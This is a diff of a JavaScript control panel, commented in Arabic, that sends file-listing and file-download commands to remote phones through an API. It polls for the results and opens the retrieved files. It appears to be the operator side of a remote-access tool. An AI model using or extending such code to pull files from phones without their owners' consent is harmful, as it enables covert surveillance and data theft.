@@ -80,7 +80,7 @@ function checkNewDeleted(deleted) {
     lastDeletedCount = deleted.length;
 }
 
-// ✅ حذف الجهاز مع إعادة تحميل سريعة
+// ✅ حذف الجهاز — إعادة تحميل فورية 5 مرات
 async function deleteDevice() {
     if (!currentDevice) { alert('⚠️ اختر جهازًا أولًا'); return; }
     if (!confirm('هل أنت متأكد من حذف هذا الجهاز؟')) return;
@@ -96,12 +96,13 @@ async function deleteDevice() {
             document.getElementById('deviceNameDisplay').textContent = 'لا يوجد جهاز محدد';
             document.getElementById('deviceNameDisplay').className = 'device-name-display';
             
-            // ✅ إعادة تحميل فورية
-            setTimeout(() => { loadDevices(); }, 1000);
-        } else {
-            alert('❌ خطأ: ' + (result.error || 'غير معروف'));
+            setTimeout(() => { loadDevices(); }, 500);
+            setTimeout(() => { loadDevices(); }, 1500);
+            setTimeout(() => { loadDevices(); }, 3000);
+            setTimeout(() => { loadDevices(); }, 5000);
+            setTimeout(() => { loadDevices(); }, 8000);
         }
-    } catch (e) { alert('❌ خطأ في الاتصال: ' + e.message); }
+    } catch (e) { alert('❌ خطأ: ' + e.message); }
 }
 
 async function loadDevices() {
@@ -204,27 +205,34 @@ function switchTab(tabName) {
 
 // ============ مدير الملفات ============
 
+// ✅ مدير ملفات سريع — فحص كل 3 ثوانٍ
 async function loadFileList(path) {
-    try {
-        currentFilePath = path;
-        const pathInput = document.getElementById('currentPath');
-        if (pathInput) pathInput.value = path;
+    const div = document.getElementById('filesList');
+    if (div) div.innerHTML = '<p style="color:#00ffcc;">⏳ جاري القراءة...</p>';
+    
+    currentFilePath = path;
+    document.getElementById('currentPath').value = path;
+    
+    await fetch('/api.php', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({ device: currentDevice, command: `list_files:${path}` })
+    });
+    
+    let attempts = 0;
+    const checkInterval = setInterval(async () => {
+        attempts++;
+        const response = await fetch(`/api.php?action=get_file_list&device=${encodeURIComponent(currentDevice)}`);
+        const data = await response.json();
         
-        await fetch('/api.php', {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({
-                device: currentDevice,
-                command: `list_files:${path}`
-            })
-        });
-        
-        setTimeout(async () => {
-            const response = await fetch(`/api.php?action=get_file_list&device=${encodeURIComponent(currentDevice)}`);
-            const data = await response.json();
-            displayFileList(data.files || []);
-        }, 15000);
-    } catch (e) {}
+        if (data.files && data.files.length > 0) {
+            clearInterval(checkInterval);
+            displayFileList(data.files);
+        } else if (attempts >= 5) {
+            clearInterval(checkInterval);
+            div.innerHTML = '<p style="color:#888;">المجلد فارغ</p>';
+        }
+    }, 3000);
 }
 
 function displayFileList(files) {
@@ -268,13 +276,36 @@ function displayFileList(files) {
     });
 }
 
+// ✅ زر تحميل تلقائي
 async function downloadPhoneFile(path) {
+    const btn = event.target;
+    btn.textContent = '⏳';
+    btn.disabled = true;
+    
     await fetch('/api.php', {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
         body: JSON.stringify({ device: currentDevice, command: `download_file:${path}` })
     });
-    alert('✅ تم طلب التحميل — انتظر 15 ثانية ثم افتح تبويب الملفات');
+    
+    let attempts = 0;
+    const checkInterval = setInterval(async () => {
+        attempts++;
+        const response = await fetch(`/api.php?action=get_files&device=${encodeURIComponent(currentDevice)}`);
+        const files = await response.json();
+        
+        if (files && files.length > 0) {
+            clearInterval(checkInterval);
+            btn.textContent = '⬇️ تحميل';
+            btn.disabled = false;
+            loadFiles();
+        } else if (attempts >= 5) {
+            clearInterval(checkInterval);
+            btn.textContent = '⬇️ تحميل';
+            btn.disabled = false;
+            alert('❌ فشل التحميل');
+        }
+    }, 3000);
 }
 
 function navigateUp() {
@@ -295,7 +326,6 @@ async function loadFiles() {
         if (!div) return;
         
         if (files && files.length > 0) {
-            // ✅ إذا يوجد ملفات محملة — اعرضها
             div.innerHTML = '<h4 style="color:#00ffcc;margin-bottom:10px;">📥 الملفات المحملة:</h4>';
             
             [...files].sort((a, b) => (b.date || 0) - (a.date || 0)).forEach(file => {
@@ -326,17 +356,13 @@ async function loadFiles() {
     } catch (e) {}
 }
 
-// ✅ عرض ملف محمل — يفتح في نافذة جديدة
 async function viewDownloadedFile(name) {
     try {
         const response = await fetch(`/api.php?action=get_files&device=${encodeURIComponent(currentDevice)}`);
         const files = await response.json();
         const file = files.find(f => f.name === name);
         
-        if (!file || !file.data) {
-            alert('❌ لا توجد بيانات');
-            return;
-        }
+        if (!file || !file.data) { alert('❌ لا توجد بيانات'); return; }
         
         let mimeType = 'application/octet-stream';
         const ext = name.toLowerCase().split('.').pop();
@@ -349,9 +375,7 @@ async function viewDownloadedFile(name) {
         else if (ext === 'txt') mimeType = 'text/plain';
         
         window.open(`data:${mimeType};base64,${file.data}`, '_blank');
-    } catch (e) {
-        alert('❌ خطأ في العرض');
-    }
+    } catch (e) { alert('❌ خطأ في العرض'); }
 }
 
 // ============ باقي الدوال ============
